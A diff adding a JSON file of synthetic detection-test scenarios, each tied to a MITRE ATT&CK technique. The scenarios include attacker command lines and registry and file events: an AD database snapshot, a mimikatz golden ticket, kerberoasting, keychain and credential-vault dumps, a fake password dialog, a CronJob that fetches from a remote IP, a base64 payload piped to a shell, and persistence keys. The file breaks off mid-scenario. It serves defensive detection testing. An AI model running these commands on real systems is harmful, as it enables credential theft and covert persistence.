@@ -1,0 +1,2248 @@
+{
+ "scenarios": [
+  {
+   "id": "val2-t1003-ntdsutil-ifm-snapshot-of-the",
+   "name": "ntdsutil IFM snapshot of the AD database",
+   "description": "Independent validation scenario for T1003, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\ntdsutil.exe",
+     "command": "ntdsutil \"activate instance ntds\" ifm \"create full C:\\ProgramData\\x\" quit quit",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1003"
+   ]
+  },
+  {
+   "id": "val2-t1110-001-slow-password-guessing-of-on",
+   "name": "slow password guessing of one account over ssh",
+   "description": "Independent validation scenario for T1110.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1110.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    },
+    {
+     "type": "auth",
+     "user": "deploy",
+     "source_ip": "198.51.100.77",
+     "method": "ssh",
+     "outcome": "failure"
+    }
+   ],
+   "expect": [
+    "T1110.001"
+   ]
+  },
+  {
+   "id": "val2-t1552-grep-sweep-of-home-dirs-for",
+   "name": "grep sweep of home dirs for embedded credentials",
+   "description": "Independent validation scenario for T1552, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/grep",
+     "command": "grep -rIE \"(password|passwd|secret|api_key)\\s*=\" /home /var/www --include=*.env --include=*.conf --include=*.ini",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1552"
+   ]
+  },
+  {
+   "id": "val2-t1552-006-search-sysvol-for-group-poli",
+   "name": "search SYSVOL for Group Policy Preferences cpassword",
+   "description": "Independent validation scenario for T1552.006, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1552.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command": "cmd.exe /c findstr /S /I cpassword \\\\corp.local\\sysvol\\corp.local\\policies\\*.xml",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    }
+   ],
+   "expect": [
+    "T1552.006"
+   ]
+  },
+  {
+   "id": "val2-t1555-dump-keychain-item-passwords",
+   "name": "dump keychain item passwords with the security CLI",
+   "description": "Independent validation scenario for T1555, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/security",
+     "command": "security dump-keychain -d /Users/ann/Library/Keychains/login.keychain-db",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1555"
+   ]
+  },
+  {
+   "id": "val2-t1555-004-enumerate-credential-manager",
+   "name": "enumerate Credential Manager vault",
+   "description": "Independent validation scenario for T1555.004, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\vaultcmd.exe",
+     "command": "vaultcmd /listcreds:\"Windows Credentials\" /all",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1555.004"
+   ]
+  },
+  {
+   "id": "val2-t1555-006-read-secrets-from-a-cloud-se",
+   "name": "read secrets from a cloud secret manager",
+   "description": "Independent validation scenario for T1555.006, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1555.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws secretsmanager get-secret-value --secret-id prod/db/master --query SecretString",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1555.006"
+   ]
+  },
+  {
+   "id": "val2-t1558-kerberoasting-with-rubeus",
+   "name": "kerberoasting with Rubeus",
+   "description": "Independent validation scenario for T1558, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1558"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Users\\Public\\Rubeus.exe",
+     "command": "Rubeus.exe kerberoast /outfile:C:\\Users\\Public\\hashes.txt",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1558"
+   ]
+  },
+  {
+   "id": "val2-t1558-001-forge-a-golden-ticket-with-m",
+   "name": "forge a golden ticket with mimikatz",
+   "description": "Independent validation scenario for T1558.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1558.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Users\\Public\\m.exe",
+     "command": "m.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1-2-3 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ptt\"",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1558.001"
+   ]
+  },
+  {
+   "id": "val2-t1528-print-an-access-token-for-a",
+   "name": "print an access token for a cloud CLI session",
+   "description": "Independent validation scenario for T1528, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1528"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/az",
+     "command": "az account get-access-token --resource https://graph.microsoft.com",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1528"
+   ]
+  },
+  {
+   "id": "val2-t1056-002-fake-password-prompt-through",
+   "name": "fake password prompt through osascript",
+   "description": "Independent validation scenario for T1056.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Credential Access"
+   ],
+   "techniques": [
+    "T1056.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -e 'display dialog \"macOS needs your password to install updates\" default answer \"\" with hidden answer with title \"System Preferences\"'",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1056.002"
+   ]
+  },
+  {
+   "id": "val2-t1069-001-enumerate-local-administrato",
+   "name": "enumerate local administrators group",
+   "description": "Independent validation scenario for T1069.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1069.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net localgroup administrators",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1069.001"
+   ]
+  },
+  {
+   "id": "val2-t1087-002-list-domain-accounts-and-adm",
+   "name": "list domain accounts and admins",
+   "description": "Independent validation scenario for T1087.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1087.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net group \"Domain Admins\" /domain",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1087.002"
+   ]
+  },
+  {
+   "id": "val2-t1590-002-dns-zone-transfer-attempt-ag",
+   "name": "DNS zone transfer attempt against a target domain",
+   "description": "Independent validation scenario for T1590.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Discovery"
+   ],
+   "techniques": [
+    "T1590.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/dig",
+     "command": "dig axfr victim-corp.example @ns1.victim-corp.example",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1590.002"
+   ]
+  },
+  {
+   "id": "val2-t1037-002-macos-login-hook-set-through",
+   "name": "macOS login hook set through defaults",
+   "description": "Independent validation scenario for T1037.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1037.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/defaults",
+     "command": "defaults write com.apple.loginwindow LoginHook /Users/Shared/.hook.sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1037.002"
+   ]
+  },
+  {
+   "id": "val2-t1037-005-startupitems-entry-dropped",
+   "name": "StartupItems entry dropped",
+   "description": "Independent validation scenario for T1037.005, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1037.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/Library/StartupItems/Updater/StartupParameters.plist",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1037.005"
+   ]
+  },
+  {
+   "id": "val2-t1053-002-at-job-scheduling-a-payload",
+   "name": "at job scheduling a payload",
+   "description": "Independent validation scenario for T1053.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/at",
+     "command": "at now + 2 minutes -f /tmp/.p.sh",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1053.002"
+   ]
+  },
+  {
+   "id": "val2-t1053-006-transient-systemd-timer-crea",
+   "name": "transient systemd timer created",
+   "description": "Independent validation scenario for T1053.006, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemd-run",
+     "command": "systemd-run --user --on-calendar=*:0/5 /tmp/.implant",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1053.006"
+   ]
+  },
+  {
+   "id": "val2-t1053-007-kubernetes-cronjob-created-f",
+   "name": "kubernetes CronJob created from the CLI",
+   "description": "Independent validation scenario for T1053.007, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/kubectl",
+     "command": "kubectl create cronjob beacon --image=alpine --schedule=\"*/5 * * * *\" -- wget -qO- http://203.0.113.40/x",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1053.007"
+   ]
+  },
+  {
+   "id": "val2-t1098-attacker-key-appended-to-roo",
+   "name": "attacker key appended to root authorized_keys",
+   "description": "Independent validation scenario for T1098, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1098"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/root/.ssh/authorized_keys",
+     "operation": "modify"
+    }
+   ],
+   "expect": [
+    "T1098"
+   ]
+  },
+  {
+   "id": "val2-t1098-001-extra-access-key-minted-for",
+   "name": "extra access key minted for an IAM user",
+   "description": "Independent validation scenario for T1098.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1098.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws iam create-access-key --user-name build-svc",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1098.001"
+   ]
+  },
+  {
+   "id": "val2-t1098-006-cluster-admin-binding-to-a-s",
+   "name": "cluster-admin binding to a service account",
+   "description": "Independent validation scenario for T1098.006, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1098.006"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/kubectl",
+     "command": "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1098.006"
+   ]
+  },
+  {
+   "id": "val2-t1136-002-domain-user-created",
+   "name": "domain user created",
+   "description": "Independent validation scenario for T1136.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1136.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net user svc_backup Passw0rd! /add /domain",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1136.002"
+   ]
+  },
+  {
+   "id": "val2-t1136-003-cloud-user-created-via-cli",
+   "name": "cloud user created via CLI",
+   "description": "Independent validation scenario for T1136.003, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1136.003"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws iam create-user --user-name support-temp",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1136.003"
+   ]
+  },
+  {
+   "id": "val2-t1137-001-office-template-macro-persis",
+   "name": "Office template macro persistence",
+   "description": "Independent validation scenario for T1137.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1137.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm",
+     "operation": "modify"
+    }
+   ],
+   "expect": [
+    "T1137.001"
+   ]
+  },
+  {
+   "id": "val2-t1176-force-load-a-browser-extensi",
+   "name": "force-load a browser extension from the command line",
+   "description": "Independent validation scenario for T1176, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1176"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/google-chrome",
+     "command": "google-chrome --load-extension=/tmp/ext --disable-extensions-except=/tmp/ext",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1176"
+   ]
+  },
+  {
+   "id": "val2-t1505-004-iis-native-module-registered",
+   "name": "IIS native module registered with appcmd",
+   "description": "Independent validation scenario for T1505.004, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1505.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\inetsrv\\appcmd.exe",
+     "command": "appcmd.exe install module /name:Helper /image:C:\\Windows\\Temp\\h.dll",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1505.004"
+   ]
+  },
+  {
+   "id": "val2-t1546-wmi-permanent-event-consumer",
+   "name": "WMI permanent event consumer created",
+   "description": "Independent validation scenario for T1546, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wbem\\wmic.exe",
+     "command": "wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name=\"upd\", CommandLineTemplate=\"calc.exe\"",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1546"
+   ]
+  },
+  {
+   "id": "val2-t1546-007-netsh-helper-dll-registered",
+   "name": "netsh helper DLL registered",
+   "description": "Independent validation scenario for T1546.007, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.007"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\netsh.exe",
+     "command": "netsh add helper C:\\Windows\\Temp\\nh.dll",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1546.007"
+   ]
+  },
+  {
+   "id": "val2-t1546-008-sethc-debugger-via-ifeo",
+   "name": "sethc debugger via IFEO",
+   "description": "Independent validation scenario for T1546.008, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.008"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
+     "operation": "set",
+     "value_name": "Debugger",
+     "value_data": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1546.008"
+   ]
+  },
+  {
+   "id": "val2-t1546-009-appcertdlls-value-set",
+   "name": "AppCertDLLs value set",
+   "description": "Independent validation scenario for T1546.009, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.009"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls",
+     "operation": "set",
+     "value_name": "evil",
+     "value_data": "C:\\Windows\\Temp\\cert.dll"
+    }
+   ],
+   "expect": [
+    "T1546.009"
+   ]
+  },
+  {
+   "id": "val2-t1546-014-emond-rule-dropped",
+   "name": "emond rule dropped",
+   "description": "Independent validation scenario for T1546.014, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.014"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/etc/emond.d/rules/sample.plist",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1546.014"
+   ]
+  },
+  {
+   "id": "val2-t1546-015-com-clsid-hijack-under-hkcu",
+   "name": "COM CLSID hijack under HKCU",
+   "description": "Independent validation scenario for T1546.015, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1546.015"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKCU\\Software\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32",
+     "operation": "set",
+     "value_name": "",
+     "value_data": "C:\\Users\\ann\\AppData\\Local\\Temp\\p.dll"
+    }
+   ],
+   "expect": [
+    "T1546.015"
+   ]
+  },
+  {
+   "id": "val2-t1547-005-security-packages-value-exte",
+   "name": "Security Packages value extended with a rogue SSP",
+   "description": "Independent validation scenario for T1547.005, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.005"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
+     "operation": "set",
+     "value_name": "Security Packages",
+     "value_data": "kerberos msv1_0 schannel wdigest evilssp"
+    }
+   ],
+   "expect": [
+    "T1547.005"
+   ]
+  },
+  {
+   "id": "val2-t1547-009-lnk-dropped-in-the-startup-f",
+   "name": "LNK dropped in the Startup folder",
+   "description": "Independent validation scenario for T1547.009, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.009"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1547.009"
+   ]
+  },
+  {
+   "id": "val2-t1547-012-print-processor-dll-register",
+   "name": "print processor DLL registered",
+   "description": "Independent validation scenario for T1547.012, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1547.012"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "registry",
+     "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\hax",
+     "operation": "set",
+     "value_name": "Driver",
+     "value_data": "hax.dll"
+    }
+   ],
+   "expect": [
+    "T1547.012"
+   ]
+  },
+  {
+   "id": "val2-t1574-001-unsigned-dll-planted-next-to",
+   "name": "unsigned DLL planted next to a service binary and loaded",
+   "description": "Independent validation scenario for T1574.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1574.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "module",
+     "module_path": "C:\\Program Files\\VendorApp\\version.dll",
+     "signed": false,
+     "module_kind": "dll"
+    }
+   ],
+   "expect": [
+    "T1574.001"
+   ]
+  },
+  {
+   "id": "val2-t1574-002-signed-host-loads-an-unsigne",
+   "name": "signed host loads an unsigned side-loaded DLL from a user folder",
+   "description": "Independent validation scenario for T1574.002, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1574.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "module",
+     "module_path": "C:\\Users\\ann\\AppData\\Local\\Temp\\mscoree.dll",
+     "signed": false,
+     "module_kind": "dll"
+    }
+   ],
+   "expect": [
+    "T1574.002"
+   ]
+  },
+  {
+   "id": "val2-t1574-004-unsigned-dylib-loaded-by-a-r",
+   "name": "unsigned dylib loaded by a relative path from a writable folder",
+   "description": "Independent validation scenario for T1574.004, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "macos",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1574.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "module",
+     "module_path": "/Users/Shared/lib/libz.1.dylib",
+     "signed": false,
+     "module_kind": "so"
+    }
+   ],
+   "expect": [
+    "T1574.004"
+   ]
+  },
+  {
+   "id": "val2-t1078-001-successful-ssh-login-with-a",
+   "name": "successful ssh login with a vendor default account",
+   "description": "Independent validation scenario for T1078.001, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Initial Access"
+   ],
+   "techniques": [
+    "T1078.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "auth",
+     "user": "pi",
+     "source_ip": "198.51.100.9",
+     "method": "ssh",
+     "outcome": "success"
+    }
+   ],
+   "expect": [
+    "T1078.001"
+   ]
+  },
+  {
+   "id": "val2-t1027-base64-decoded-script-piped",
+   "name": "base64-decoded script piped to a shell",
+   "description": "Independent validation scenario for T1027, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1027"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -c \"echo ZWNobyBoaSA+IC90bXAvbw== | base64 -d | sh\"",
+     "parent_exe": "/usr/bin/python3"
+    }
+   ],
+   "expect": [
+    "T1027"
+   ]
+  },
+  {
+   "id": "val2-t1027-004-payload-source-delivered-the",
+   "name": "payload source delivered then compiled on the host",
+   "description": "Independent validation scenario for T1027.004, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1027.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/gcc",
+     "command": "gcc -o /tmp/.svc /tmp/dl/svc.c -lpthread",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1027.004"
+   ]
+  },
+  {
+   "id": "val2-t1027-010-caret-splitting-inside-a-cmd",
+   "name": "caret splitting inside a cmd line",
+   "description": "Independent validation scenario for T1027.010, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1027.010"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command": "cmd.exe /c \"p^o^w^e^r^s^h^e^l^l -w hidden -c i^e^x\"",
+     "parent_exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    }
+   ],
+   "expect": [
+    "T1027.010"
+   ]
+  },
+  {
+   "id": "val2-t1036-svchost-exe-running-from-a-p",
+   "name": "svchost.exe running from a public user folder",
+   "description": "Independent validation scenario for T1036, written from the public ATT&CK procedure description, not from rule samples. Synthetic data only; nothing is executed.",
+   "kind": "single",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1036"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
